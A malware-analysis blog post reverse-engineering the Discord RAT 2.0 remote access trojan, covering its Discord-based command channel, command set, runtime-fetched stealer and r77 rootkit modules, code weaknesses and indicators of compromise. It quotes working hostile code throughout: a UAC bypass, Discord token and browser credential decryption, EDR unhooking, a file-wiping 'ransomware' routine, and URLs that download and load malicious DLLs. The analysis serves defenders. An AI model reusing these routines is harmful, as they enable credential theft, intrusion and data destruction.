---
title: "Discord RAT 2.0: When Your C2 is a Chat Server"
permalink: /blog/discord-rat-2-chat-server-c2/
date: 2026-04-21 00:00:00 +0000
categories: [malware-reversing, threat-intel]
tags: [discord-rat, moom825, dotnet, rat, r77-rootkit, bytecode77, blacknet, token-grabber, process-hollowing, ppid-spoof, yara, csharp]
image:
  path: /assets/images/posts/discord-rat-2/logo.png
  alt: "Discord RAT 2.0 analysis"
description: "Reverse-engineering moom825's Discord RAT 2.0: Discord WebSocket C2, 50 ! commands, a ransomware module that only encrypts one byte, and a modular loader that pulls r77-rootkit and the BlackNET password stealer off GitHub at runtime."
---

## The Setup

A new builder-generated sample landed in the threat intel feed today. The file is named `Client-Built.exe`, which turns out to be the default stub output of a well-known open-source crimeware builder. At 89.6 KB, it is clean, unobfuscated, and fully readable once you point ILSpy at it. What you find inside is a feature-complete remote administration tool that uses Discord's own WebSocket gateway as its command-and-control channel, an architecture that lets the operator manage victims through a Discord server while blending in with the billion-dollar platform's legitimate traffic.

This post tears apart the sample end to end: how it establishes its session, every command it understands, the five remote modules it pulls at runtime, where its implementation fails, who built the pieces it copied, and the detection artifacts you can use to hunt it.

---

## Sample Properties

| Field | Value |
|-------|-------|
| File name | Client-Built.exe |
| SHA-256 | `18c79efc9dea7a878ddf0071cd76313afa342855df5c709c6f18883599bc64b9` |
| MD5 | `10bda41342b01245e36bcec9824d97bc` |
| File size | 89,600 bytes |
| Format | PE32+, .NET 4.8 (x86-64) |
| Compiler timestamp | 2046-09-02 (forged, far-future) |
| Obfuscation | None |
| Namespace | `Discord_rat` |
| Assembly GUID | `7c38fd3b-41e1-43ff-87e3-2f3ef6e2596d` |
| Family | Discord RAT 2.0 (moom825) |

---

## Kill Chain

![Kill chain flowchart](/assets/images/posts/discord-rat-2/killchain.png){: .image-centered }

---

## C2 Architecture: Discord as Infrastructure

The binary connects to Discord's WebSocket gateway at startup and uses the platform as a bidirectional command channel. This is a deliberate choice: Discord traffic traverses port 443, carries a trusted TLS certificate, and most corporate proxies and endpoint tools treat it as benign SaaS.

The gateway URL embedded in the binary has a typo that persists from the original source repository:

```csharp
await client.ConnectAsync("wss://gateway.discord.gg/?v=9&encording=json");
//                                                     ^^^^^^^^^
//                                                     typo in upstream source
```

Discord ignores the unknown query parameter, so it works. The typo is a reliable YARA fingerprint.

After connecting, the client authenticates using a hardcoded bot token with a Gateway Identify payload (opcode 2). The identity is disguised as a Chrome browser on Linux:

```csharp
public static async Task login(string token)
{
    string text = DictionaryToJson(new Dictionary<object, object>
    {
        { "op", 2 },
        {
            "d",
            new Dictionary<object, object>
            {
                { "token", token },
                { "intents", 32767 },           // all intents
                {
                    "properties",
                    new Dictionary<object, object>
                    {
                        { "os",      "linux"  },
                        { "browser", "chrome" },
                        { "device",  "chrome" }
                    }
                }
            }
        }
    });
    await client.SendMessageAsync(text);
}
```

Once authenticated, the client joins a specific Discord guild (server) whose ID is baked into the binary. It creates a new text channel named `session-N` (where N is the next available integer), then announces the new victim to everyone in the server:

```csharp
string message = string.Format(
    "@everyone :white_check_mark: New session opened {0} | User: {2} | IP: {1} | Admin: {3}",
    "session-" + biggest,
    await getip(),
    Environment.UserName,
    new WindowsPrincipal(WindowsIdentity.GetCurrent())
        .IsInRole(WindowsBuiltInRole.Administrator).ToString()
);
```

The extracted configuration from this sample:

| Config field | Value |
|---|---|
| Bot token | `MTA4MDk4MTIyMDY1OTI5ODM1Nw[.]Ge9WdI[.][REDACTED_HMAC]` |
| Guild ID | `1080979971050319872` |
| Gateway | `wss://gateway[.]discord[.]gg/?v=9&encording=json` |

The bot token is stored in a `settings` class with no encryption or obfuscation:

```csharp
internal class settings
{
    public static string Bottoken = "MTA4MDk4MTIyMDY1OTI5ODM1Nw[.]Ge9WdI[.][REDACTED_HMAC]";
    public static string Guildid  = "1080979971050319872";
}
```

---

## Command Set

The operator interacts through Discord messages prefixed with `!`. The command dispatcher is a switch statement on the first token of the message. There are 50 commands implemented. Below is a categorized breakdown.

### Recon and Discovery

| Command | Action |
|---------|--------|
| `!admincheck` | Reports whether the process is elevated |
| `!idletime` | Returns `GetLastInputInfo` idle time in seconds |
| `!datetime` | Returns system date/time |
| `!geolocate` | Calls `geolocation-db[.]com/json` and returns a Google Maps link |
| `!listprocess` | Enumerates all running processes |
| `!dir` | Lists current directory |
| `!currentdir` | Returns current working directory |
| `!cd <path>` | Changes working directory |

### Collection

| Command | Action |
|---------|--------|
| `!screenshot` | Captures primary screen via GDI `CopyFromScreen`, sends as PNG |
| `!clipboard` | Returns clipboard text via `Clipboard.GetText()` |
| `!webcampic` | Captures webcam frame (loads `Webcam.dll` from GitHub) |
| `!getcams` | Lists available webcam devices |
| `!password` | Extracts saved browser credentials (loads `PasswordStealer.dll`) |
| `!grabtokens` | Harvests Discord user tokens (loads `Token grabber.dll`) |
| `!robloxcookie` | Reads `HKCU\Software\Roblox\RobloxStudioBrowser\roblox.com\.ROBLOSECURITY` |

### File Operations

| Command | Action |
|---------|--------|
| `!download <path>` | Uploads file from victim to Discord (or file.io if >7.5 MB) |
| `!upload <file>` | Writes Discord attachment to specified path on victim |
| `!uploadlink <url> <dest>` | Fetches URL and saves to victim path |
| `!delete <path>` | Deletes a single file |
| `!deletefolder <path>` | Recursively deletes folder contents |
| `!deleteallfiles` | Deletes 77 file types from all drives, skipping system folders |

### Execution and Interaction

| Command | Action |
|---------|--------|
| `!shell <cmd>` | Runs via `cmd.exe /C`, returns stdout |
| `!voice <text>` | `SpeechSynthesizer.Speak()` plays text-to-speech on victim speakers |
| `!audio <attachment>` | Plays WAV/audio attachment via `SoundPlayer` |
| `!write <text>` | Types text on the active window using `SendKeys.SendWait()` |
| `!message <text>` | Pops a `MessageBox.Show()` dialog |
| `!website <url>` | Opens URL via `Process.Start()` |
| `!prockill <name>` | Kills all processes matching name |
| `!block` / `!unblock` | Blocks/unblocks keyboard and mouse via `BlockInput` |
| `!wallpaper <img>` | Sets desktop wallpaper via `SystemParametersInfo` |
| `!shutdown` / `!restart` / `!logoff` | Power control |

### Persistence and Privilege Escalation

| Command | Action |
|---------|--------|
| `!startup` | Adds to startup (scheduled task if admin, Run key if not) |
| `!uacbypass` | Hijacks `%windir%` environment variable, triggers `SilentCleanup` scheduled task |

The UAC bypass is the classic `%windir%` + `SilentCleanup` technique:

```csharp
public static async Task uacbypass(string path, string channelid)
{
    // Set %windir% to the payload path so SilentCleanup auto-elevates it
    Environment.SetEnvironmentVariable("windir",
        "\"" + path + "\" ;#",
        EnvironmentVariableTarget.User);
    Process.Start(new ProcessStartInfo {
        FileName  = "SCHTASKS.exe",
        Arguments = "/run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I",
        // ...
    });
    await Task.Delay(1500);
    // Restore windir after elevation
    Environment.SetEnvironmentVariable("windir",
        Environment.GetEnvironmentVariable("systemdrive") + "\\Windows",
        EnvironmentVariableTarget.User);
}
```

Persistence keys use the `$77` prefix, which also appears in the rootkit configuration:

- Non-admin: `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\$77Client-Built.exe`
- Admin: SCHTASKS `/tn "$77Client-Built.exe" /sc onlogon /rl HIGHEST`

### Defense Evasion

| Command | Action |
|---------|--------|
| `!disabledefender` | `powershell Add-MpPreference -ExclusionPath "C:\\"` |
| `!disablefirewall` | `NetSh Advfirewall set allprofiles state off` |
| `!disabletaskmgr` | Sets `HKCU\...\Policies\System\DisableTaskMgr = 1` |
| `!enabletaskmgr` | Removes the above value |
| `!critproc` | Calls `NtSetInformationProcess(ProcessBreakOnTermination=1)`; killing the process triggers a BSOD |
| `!uncritproc` | Removes critical process flag |
| `!rootkit` | Loads `rootkit.dll` from GitHub, registers PID and path in `HKLM\SOFTWARE\$77config` |

### Destructive Capabilities

#### Fake Ransomware (`!ransomware`)

The ransomware command is the most talked-about feature and the most broken one. Files are renamed to `<original>.WANNACRY` and encrypted with Rijndael:

```csharp
public static void EncryptFileFunction(string inputFile, string outputFile)
{
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
        byte[] bytes  = Encoding.UTF8.GetBytes("HAIROAHSJURNCBYE"); // key
        byte[] bytes2 = Encoding.UTF8.GetBytes("HAIROAHSJURNCBYE"); // IV, same as key
        using FileStream stream   = new FileStream(outputFile, FileMode.Create);
        using ICryptoTransform t  = rijndaelManaged.CreateEncryptor(bytes, bytes2);
        using CryptoStream cs     = new CryptoStream(stream, t, CryptoStreamMode.Write);
        using FileStream fileStream = new FileStream(inputFile, FileMode.Open);

        for (int i = 0; i < 1; i++)   // BUG: loop runs exactly once
        {
            int num = fileStream.ReadByte();
            cs.WriteByte((byte)num);   // only the first byte is encrypted
        }
    }
    File.Delete(inputFile);
}
```

The loop bound `i < 1` means exactly **one byte** of each file is encrypted. The original file is then deleted and replaced with a one-byte ciphertext file. The victim's data is not recoverable from the `.WANNACRY` output, but it was not encrypted either, it was simply destroyed. There is no ransom demand, no key storage, no decryption path. This is a wiper pretending to be ransomware.

#### BSOD (`!bluescreen`)

```csharp
public static void Bluescreen()
{
    RtlAdjustPrivilege(19, true, false, out var _); // SeShutdownPrivilege
    NtRaiseHardError(
        0xC0000374u, // STATUS_HEAP_CORRUPTION
        0u, 0u,
        IntPtr.Zero,
        6u,          // OptionAbortRetryIgnore -> forces immediate BSOD
        out var _);
}
```

### Modular DLL Loading

The password stealer, webcam capture, Discord token grabber, and rootkit are not embedded. They are fetched at runtime from the public GitHub repository and loaded via `Assembly.Load()`:

```csharp
public static Dictionary<string, string> dll_url_holder = new Dictionary<string, string>
{
    { "password",  "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/PasswordStealer.dll" },
    { "rootkit",   "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/rootkit.dll" },
    { "unrootkit", "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/unrootkit.dll" },
    { "webcam",    "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Webcam.dll" },
    { "token",     "https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Resources/Token%20grabber.dll" }
};
```

Modules are cached in `dll_holder` after the first load so subsequent commands do not re-fetch.

---

## External Validation and Operator Attribution

### Cross-Referencing Public Threat Intel

The static analysis above was validated against independent public reporting:

| Source | Date | Relevance |
|--------|------|-----------|
| [SANS Internet Storm Center (Xavier Mertens)](https://isc.sans.edu/diary/31928) | 2025-05-07 | Analyzed sample `9cac561e2da992f974286bdb336985c1ee550abd96df68f7e44ce873ef713f4e`, same family, different build. Confirms the five-module GitHub architecture. |
| [Luca Kuechler's Blog](https://lucakuechler.github.io/posts/discord-rat-malware/) | independent | Confirms Discord WebSocket gateway C2, module fetch URLs, Defender bypass. Their sample carried a different operator token (`MTEzNTM5NDcwMTk3ODEwODAxNg.GtdDHG.<redacted>`), demonstrating this builder has many operators. |
| [BleepingComputer (Abaddon)](https://www.bleepingcomputer.com/news/security/new-rat-malware-gets-commands-via-discord-has-ransomware-feature/) | 2020-10-23 | Precursor Discord C2 RAT from MalwareHunterTeam. Abaddon introduced the concept of Discord-gateway C2 but is a separate codebase; Discord RAT 2.0 (released Aug 2022) is the direct descendant. |
| [ReversingLabs: npm node-hide-console-windows](https://www.reversinglabs.com/blog/tracking-discord-rat-family) | 2024-10 (initial), 2025-10 (follow-up) | Documents Discord RAT 2.0 being dropped by a weaponized npm package. Also catalogs a separate but contemporaneous Discord-C2 family tree (UwUdisRAT, STD RAT, Minecraft RAT, Propionanilide RAT, all attributed to "STD Group"). The STD-Group family is written in C++ and is **not** the same lineage as moom825's C# Discord RAT 2.0 despite surface similarities. |
| [Cyfirma: Discord-based RAT](https://www.cyfirma.com/research/analysis-of-a-discord-based-remote-access-trojan-rat/) | undated | Covers a Python-based Discord RAT, distinct lineage. |

Luca's writeup renders the gateway URL as `encoding=json` (corrected in prose), but the raw upstream source at [`moom825/Discord-RAT-2.0/Discord rat/Program.cs`](https://raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord%20rat/Program.cs) carries the typo `encording=json` verbatim, which this sample faithfully reproduces.

### The Builder Ecosystem

Discord RAT 2.0 is not attributed to a named APT, group, or criminal brand. It is commodity crimeware originating from a public GitHub repository (`github.com/moom825/Discord-RAT-2.0`, 630 stars, 146 forks as of April 2026, last release 2.0 dated August 2022). The author labels it "educational." In practice, every public sandbox submission of the builder output is flagged as malicious.

Each victim sample carries the **specific operator's** Discord bot token and guild ID, so attribution is per-campaign: the sample tells you who is running that instance, not who wrote the tool. Multiple unrelated operators use the same stub binary.

### This Operator's Infrastructure (snowflake decode)

Discord snowflake IDs embed the UNIX creation timestamp in the upper 42 bits. Decoding the burned-in identifiers from this sample:

```python
DISCORD_EPOCH = 1420070400000  # 2015-01-01 UTC
def snowflake_to_date(sf):
    return datetime.fromtimestamp(((sf >> 22) + DISCORD_EPOCH) / 1000, tz=timezone.utc)
```

| Artifact | Value | Decoded |
|----------|-------|---------|
| Guild ID | `1080979971050319872` | Created **2023-03-02 22:28:28 UTC** |
| Bot user ID (from token prefix `MTA4MDk4MTIyMDY1OTI5ODM1Nw` base64-decoded to `1080981220659298357`) | see decode | Bot account created **2023-03-02 22:33:26 UTC** |
| Token issued/rotated (second segment `Ge9WdI` is base64 of `Unix_ts - 1293840000`) | `435115636 + 1293840000` | Token issued **2024-10-15 01:27:16 UTC** |

**Timeline of this operator:**

- **2023-03-02 22:28 UTC**: Operator creates Discord server for C2
- **2023-03-02 22:33 UTC**: Operator registers bot (4 min 58 s later, same session)
- **2024-10-15 01:27 UTC**: Operator rotates the bot token (sample must have been built after this moment)
- **2026-04-21**: Sample appears in the live feed, ~18 months after the token was issued

### Infrastructure Status Check (at time of analysis)

Two Discord API probes (no authentication, no disruptive actions) confirm the operator has been burned:

```text
GET /api/v10/users/@me        (with Authorization: Bot <token>)
  -> HTTP 401 Unauthorized     (token revoked or bot account terminated)

GET /api/v10/guilds/{guild_id}/widget.json
  -> HTTP 10004 "Unknown Guild" (server deleted or T&S banned)
```

Discord Trust & Safety or the operator themselves has already pulled down both the token and the guild. Any sandbox detonation performed after this point will not capture outbound Discord gateway traffic, because the WebSocket handshake fails before any `MESSAGE_CREATE` events arrive. This explains the ANY.RUN reports of this family where no Discord API calls were observed in traffic capture; the bot was already dead when the sandbox booted it.

### Dynamic Analysis Observations (from related samples)

Because this specific operator's C2 is dead, live behavioral signals must be drawn from sibling samples of the same builder. Public ANY.RUN reports of Discord RAT 2.0 consistently show:

- `raw.githubusercontent.com` DNS lookups (module fetch)
- TLS connections to `gateway.discord.gg` (port 443) after ~2 s delay
- `discord.com` API calls to `/api/v{9,10}/channels/<id>/messages`
- `geolocation-db.com` reverse-lookup on first beacon
- Write to `HKCU\...\Run\$77<filename>` when executed without admin
- `SCHTASKS.exe` invocation when executed with admin

None of this requires the operator's token to be live. The Discord DNS lookups and the first WebSocket connect happen unconditionally.

### Distribution Vectors (historically observed)

Discord RAT 2.0 has been observed in the wild via:

1. **"Free Discord Nitro" social-engineering**: direct DMs linking to a builder stub renamed to match the lure (BleepingComputer, 2020-2023).
2. **Weaponized npm packages**: `node-hide-console-windows` dropping a Discord RAT 2.0 stub (ReversingLabs, October 2024).
3. **Cracked software bundles and game cheats**: the builder-default `Client-Built.exe` name appears inside pirated-software zip archives on forums.
4. **Discord invite hijacking**: multi-stage chains that start from hijacked Discord invite links (Check Point Research, 2025).

The sample analyzed here does not itself contain a dropper or loader, so it was almost certainly delivered by one of the above wrappers that was not captured by the feed.

---

## Remote Module Analysis

The five modules fetched from the moom825 GitHub repo at runtime are publicly downloadable. Pulling and decompiling all five reveals that the "Discord RAT 2.0" label is doing a lot of work here. Most of the dangerous functionality is not moom825's code at all. It is a lightly-glued collection of other people's offensive tooling, reachable by `Assembly.Load(byte[])` reflection from a public GitHub URL.

### Module Inventory

| Module | SHA-256 | Size | Format | What it actually is |
|--------|---------|------|--------|---------------------|
| `PasswordStealer.dll` | `ae8abf10e555cee9769abea0e2d3379b11bc6a817f75a0b6038d294fa3d6a136` | 53 KB | .NET x86 | **BlackNET Password Stealer Plugin** (copyright "Black.Hacker, 2021", company "DarkSoftwareCo"), not original code. |
| `Token grabber.dll` | `a3ca8d72edaf4ffb84a38e88a31f9e537d7d7b76f7cc7966583c7b4b4a811c74` | 2.8 MB | .NET x86 | Discord token grabber with 22 browser targets and full BouncyCastle bundled in for AES-GCM. |
| `Webcam.dll` | `965494b6b3574b5e7afd2cdfdaf42813a3034a37f5309daf5afee63401894da2` | 39 KB | .NET x64 | Thin wrapper over the `AForge.Video.DirectShow` library. |
| `rootkit.dll` | `8fdae5b4490183c9057a684f0ac2f82dd5c8911cb2f43a54ff47a9ad6e93952a` | 223 KB | .NET x86 | Process-hollowing stager that drops **r77-rootkit** (bytecode77) into `dllhost.exe`. |
| `unrootkit.dll` | `4350a69f2630214a7b079e41e3ac2d7c5759a622a0cd1227ba12eee06d758d9a` | 3.3 MB | .NET x86 | Same stager architecture, carries the r77 **uninstaller** payload. |

### `PasswordStealer.dll` -> BlackNET-derived

The assembly metadata is not subtle:

```csharp
[assembly: AssemblyCopyright("Copyright (c) Black.Hacker - 2021")]
[assembly: AssemblyDescription("BlackNET Password Stealer Plugin")]
[assembly: AssemblyCompany("DarkSoftwareCo")]
[assembly: Guid("983ae28c-91c3-4072-8cdf-698b2ff7a967")]
```

This is the credential-stealing plugin from the **BlackNET** malware-as-a-service family, not moom825-authored code. The namespace `PasswordStealer.ChromeRecovery` handles Chromium credential extraction via DPAPI unwrap of the `Local State` encryption key.

### `Token grabber.dll` -> DPAPI + AES-GCM harvester of 22 apps

The grabber enumerates 22 Chromium-based browsers and Discord variants, reads their LevelDB Local Storage, and extracts Discord authentication tokens. The target list is stored as base64-encoded paths to make grep-style detection harder:

| Discord clients | Chromium browsers |
|---|---|
| Discord (Stable) | Chrome, Chrome SxS, Edge, Brave, Opera Stable, Opera GX, Opera Neon, Yandex, Vivaldi, Epic Privacy Browser |
| Discord PTB | Amigo, Torch, Kometa, Orbitum, CentBrowser, 7Star, Sputnik, Uran |
| Discord Canary | |
| Discord Development | |

For each browser, the grabber reads `.ldb` files under `\Local Storage\leveldb\` and runs three regex patterns against the raw contents:

```csharp
Regex regex  = new Regex("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");  // unencrypted v1 token
Regex regex2 = new Regex("mfa\\.[\\w-]{84}");                      // MFA-bound token
Regex regex3 = new Regex("(dQw4w9WgXcQ:)([^.*\\['(.*)'\\].*$][^\"]*)"); // encrypted v2 token
```

The `dQw4w9WgXcQ:` prefix is the marker Discord inserts before its DPAPI+AES-GCM-encrypted token blobs. (Yes, that string is the YouTube video ID for "Never Gonna Give You Up", a rickroll joke preserved in Discord's own client code.)

When it finds an encrypted token, it decrypts it in two steps:

```csharp
private static byte[] Decryptkey(string path)
{
    // Read Local State JSON, pull os_crypt.encrypted_key, base64-decode,
    // skip the 5-byte "DPAPI" prefix, unwrap with ProtectedData.Unprotect.
    return ProtectedData.Unprotect(
        Convert.FromBase64String(
            (string)ObjectToDictionary(
                JsonToDictionary(File.ReadAllText(path))["os_crypt"])["encrypted_key"])
            .Skip(5).ToArray(),
        null, DataProtectionScope.CurrentUser);
}

private static string DecryptToken(byte[] buffer, string localstate_path)
{
    byte[] ciphertext = buffer.Skip(15).ToArray();      // skip 3-byte prefix + 12-byte nonce
    AeadParameters parameters = new AeadParameters(
        new KeyParameter(Decryptkey(localstate_path)),
        128,                                            // 128-bit auth tag
        buffer.Skip(3).Take(12).ToArray(),              // 12-byte nonce
        null);
    GcmBlockCipher gcm = new GcmBlockCipher(new AesEngine());
    gcm.Init(forEncryption: false, parameters);
    // ... DoFinal and return UTF-8
}
```

Each recovered token is then validated against `discord.com/api/v9/users/@me` before being returned to the C2; the module discards dead tokens so it only exfiltrates live sessions. BouncyCastle is bundled because .NET Framework 4.x lacks native AES-GCM.

### `Webcam.dll` -> AForge DirectShow wrapper

A benign-looking wrapper around the open-source AForge.NET video library. It enumerates `FilterCategory.VideoInputDevice`, excludes software-only capture devices (`"@device:sw"` MonikerString prefix), connects to the selected camera, grabs a single JPEG frame and returns the bytes. Assembly GUID `dbae6a6e-ae23-4de9-9ab2-6a8d2cd59def`.

### `rootkit.dll` -> r77 stager with EDR unhooking and PPID spoofing

This is the deepest discovery in the bundle. The "rootkit" module is not itself a rootkit. It is a **loader** that deploys the [r77-rootkit by bytecode77](https://github.com/bytecode77/r77-rootkit), a ring-3 process-hiding rootkit. The .NET stager performs three distinct steps.

**Step 1: Unhook ntdll/kernel32 from disk.** Before any syscalls, the stager reads the on-disk copy of `ntdll.dll` and `kernel32.dll`, parses the PE, finds the `.text` section, and `memcpy`s the clean bytes over the in-memory copy to strip any inline EDR hooks:

```csharp
public unsafe static void UnhookDll(string name)
{
    string path = (Is64Bit && IntPtr.Size == 4) ? "C:\\Windows\\SysWOW64\\" : "C:\\Windows\\System32\\";
    IntPtr module = GetModuleHandle(name);
    // Map clean on-disk copy, walk section headers, locate .text
    for (short i = 0; i < numberOfSections; i++)
    {
        if (sectionName.StartsWith(".text"))
        {
            VirtualProtect(baseInMemory + rva, size, PAGE_EXECUTE_READWRITE, out old);
            memcpy(baseInMemory + rva, diskMap + rva, size);   // stomp hooks
            VirtualProtect(baseInMemory + rva, size, old, out _);
        }
    }
}
```

**Step 2: Decrypt and decompress the embedded native payload.** The .NET resources `InstallService32` and `InstallService64` are encrypted with a custom rolling-XOR scheme and then gzipped. The decryption routine is naively implemented:

```csharp
private static byte[] Decrypt(byte[] data)
{
    int num = BitConverter.ToInt32(data, 0);     // seed = first 4 bytes as signed int32
    byte[] array = new byte[data.Length - 4];
    for (int i = 0; i < array.Length; i++)
    {
        array[i] = (byte)(data[i + 4] ^ (byte)num);
        num = (num << 1) | (num >> 31);           // "rotate", but >> is arithmetic on signed int
    }
    return array;
}
```

Because C# right-shifts of signed integers are **arithmetic** (sign-extending), as soon as the seed's high bit flips to 1 the rotation degenerates to `num = 0xFFFFFFFF` permanently. From that byte onward every ciphertext byte is XORed with `0xFF`, which is a one-byte XOR "cipher". Decryption requires emulating this C# semantic quirk; a pure rotate-left gives the wrong output. After decryption, the plaintext is gzip-compressed (`1F 8B 08`).

Decrypting and decompressing both resources yields the actual r77 payloads:

| Resource | Size after decrypt+gunzip | SHA-256 |
|----------|--------------------------|---------|
| `InstallService32` | 194,560 B (PE32) | `e240adf28ad0667a9ddc4947ae18c26e8ee3aa9cb4d4aab08e16c9b7e73736ef` |
| `InstallService64` | 245,248 B (PE32+) | `24c5036e3e00a14093ada6e6e35581f100b3991f95ad2a393ac047d76a29e0b3` |

Both carry PDB paths that confirm the family:

```
A:\Code\GitHub\r77-rootkit\vs\Release\InstallService32.pdb
A:\Code\GitHub\r77-rootkit\vs\Release\r77-x86.pdb
A:\Code\GitHub\r77-rootkit\vs\x64\Release\InstallService64.pdb
A:\Code\GitHub\r77-rootkit\vs\x64\Release\r77-x64.pdb
```

These are the unmodified r77 release binaries from bytecode77's GitHub repository, built on drive `A:`.

The `rootkit.dll` assembly itself is not moom825-authored code either. Its PDB path reads `A:\Code\GitHub\r77-rootkit\vs\InstallStager\obj\Release\InstallStager.pdb`. The .NET stager is literally the `InstallStager` C# project from inside bytecode77's own r77-rootkit source tree, recompiled as a DLL instead of an EXE. moom825 shipped this module by renaming `InstallStager.dll` to `rootkit.dll` and hosting it on GitHub. The .NET code, the embedded native payload, and the decryption routine are all bytecode77's, including the signed-shift bug in the XOR routine.

**Step 3: PPID-spoofed process hollowing into dllhost.exe.** The stager calls `CreateProcess("dllhost.exe", "/Processid:{GUID}", ..., CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT)` with an updated `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute pointing at `winlogon.exe`'s handle. This makes the child's parent PID field in EPROCESS point to winlogon, not to the .NET host that actually started it, a defence-evasion trick that confuses tree-walking EDR visualisations. After the suspended dllhost is created, the stager does standard RunPE process hollowing:

```
NtUnmapViewOfSection(dllhost, originalImageBase);
NtAllocateVirtualMemory(dllhost, originalImageBase, sizeOfImage, RWX);
NtWriteVirtualMemory(dllhost, originalImageBase, r77PayloadHeaders + sections);
NtGetContextThread(thread, ctx);
// patch PEB ImageBaseAddress + set EIP/RIP to r77 entry point
NtSetContextThread(thread, ctx);
NtResumeThread(thread);
```

The COM "Processid" command-line argument is a random GUID, chosen to look like a real COM Surrogate invocation in Process Explorer.

### `unrootkit.dll` -> r77 uninstaller, compiled by "maxim"

Same three-step stager, but carrying a different pair of payloads: r77's uninstall tool. These payloads have a very different provenance from the install payloads. Their PDB paths read:

```
C:\Users\maxim\Desktop\project windows + android\rootkit\r77-rootkit-master\r77-rootkit-master\vs\Debug\Uninstall.pdb
C:\Users\maxim\Desktop\project windows + android\rootkit\r77-rootkit-master\vs\x64\Debug\Uninstall64.pdb
```

The install-side binaries came from `A:\Code\GitHub\r77-rootkit\`, bytecode77's own build drive, per the r77 repo release artifacts. The uninstall-side binaries are **debug-mode rebuilds** from `r77-rootkit-master\r77-rootkit-master\` (the tell-tale zip-file double directory you get when you download a GitHub master zip and extract it), on a local machine whose Windows user profile is **`maxim`**. The folder name "project windows + android" suggests a side project, not a clean r77 checkout.

The reasonable reading is that moom825 (or a contributor) didn't have a pre-built `Uninstall.exe` from bytecode77, so someone named `maxim` compiled it themselves from the r77-rootkit master zip in debug mode and committed the resulting binary. The operator OPSEC here is quite poor: a Windows username is now permanently embedded in every victim who runs `!unrootkit`, reachable via a single `strings` scan of the decrypted resource.

The Uninstall payloads also import **Microsoft Detours**-style strings ("Client hook allocation failure at file %hs line %d."), consistent with r77's use of Detours for its ring-3 API hooks.

---

## Module Fetch Chain of Custody

The full compromise chain, module-by-module:

1. The victim runs `Client-Built.exe` (moom825's builder stub).
2. The stub connects to Discord, awaits `!password`, `!grabtokens`, `!webcampic`, or `!rootkit`.
3. On first use of each, the stub does an HTTPS GET to `raw.githubusercontent.com/moom825/Discord-RAT-2.0/master/Discord rat/Resources/<module>.dll`.
4. The bytes are handed to `Assembly.Load()`. They **never touch disk** and the module's exported type is instantiated via reflection.
5. For rootkit/unrootkit, the loaded .NET module then unpacks its embedded native r77 payload, unhooks ntdll, PPID-spoofs winlogon, and process-hollows `dllhost.exe`.

The entire chain hinges on the GitHub repo `moom825/Discord-RAT-2.0` remaining available. If GitHub honors a takedown, steps 3-5 break and the stub loses credential theft, webcam capture, and the rootkit entirely. The shell, screenshot, clipboard, wallpaper, BSOD, wiper and "ransomware" features would still work because they are implemented directly in the stub.

---

## Code Weaknesses

**CW-001: Fake ransomware only encrypts one byte.** The `for (int i = 0; i < 1; i++)` loop in `EncryptFileFunction` runs exactly once, writing one byte to the output file. All file content beyond the first byte is silently discarded. Victims lose their data but cannot pay to recover it because there is nothing to decrypt.

**CW-002: Rijndael key and IV are identical.** Using the same value for both key and IV (`HAIROAHSJURNCBYE`) nullifies the IV's role in CBC chaining. This is a basic cryptographic error.

**CW-003: Bot token stored in plaintext.** The `settings` class holds the bot token and guild ID as string literals with no encoding or obfuscation. Any analyst can extract the token within seconds and enumerate or disrupt the attacker's C2 server.

**CW-004: Modules fetched from a public, removable GitHub repo.** If GitHub removes `moom825/Discord-RAT-2.0` (or the releases), the password stealer, rootkit, and webcam modules become permanently inaccessible. The core RAT continues to function, but its most dangerous capabilities go offline.

**CW-005: `encording` typo in gateway URL.** This trivial misspelling from the original codebase is preserved in every build and provides a string-level YARA signature that is unlikely to appear in legitimate software.

**CW-006: Debug console output left in ReceiveLoop.** `Console.WriteLine("e1")` fires on every received WebSocket frame. Behaviour-based sandboxes can fingerprint this.

**CW-007: Signed-shift bug in rootkit XOR cipher.** The `(num << 1) | (num >> 31)` line in `rootkit.dll`'s Decrypt() is intended to be a rotate-left, but C# arithmetic right shifts on negative int32 yield `-1`. Once the seed's high bit flips, every subsequent byte is XORed with `0xFF`. The "cipher" collapses to a one-byte XOR within at most 8 iterations. Analysts must emulate the bug to decrypt, not write a textbook ROL.

**CW-008: Operator PDB paths leak Windows usernames.** The Uninstall payloads inside `unrootkit.dll` carry PDB references to `C:\Users\maxim\Desktop\project windows + android\rootkit\...`. This Windows profile name is embedded in every victim that runs `!unrootkit`.

---

## IOC Appendix

### Hashes

| Type | Value |
|------|-------|
| Stub SHA-256 | `18c79efc9dea7a878ddf0071cd76313afa342855df5c709c6f18883599bc64b9` |
| Stub MD5 | `10bda41342b01245e36bcec9824d97bc` |
| Stub SHA-1 | `8ed3079ed05871a55b5c43a09da0c3accc711eb1` |
| PasswordStealer.dll | `ae8abf10e555cee9769abea0e2d3379b11bc6a817f75a0b6038d294fa3d6a136` |
| Token grabber.dll | `a3ca8d72edaf4ffb84a38e88a31f9e537d7d7b76f7cc7966583c7b4b4a811c74` |
| Webcam.dll | `965494b6b3574b5e7afd2cdfdaf42813a3034a37f5309daf5afee63401894da2` |
| rootkit.dll | `8fdae5b4490183c9057a684f0ac2f82dd5c8911cb2f43a54ff47a9ad6e93952a` |
| unrootkit.dll | `4350a69f2630214a7b079e41e3ac2d7c5759a622a0cd1227ba12eee06d758d9a` |
| InstallService32.exe (decrypted) | `e240adf28ad0667a9ddc4947ae18c26e8ee3aa9cb4d4aab08e16c9b7e73736ef` |
| InstallService64.exe (decrypted) | `24c5036e3e00a14093ada6e6e35581f100b3991f95ad2a393ac047d76a29e0b3` |
| Uninstall32.exe | `2a55b2edd020f1821fcb4028869fe72571910263188972ff1c7bbd927da447f5` |
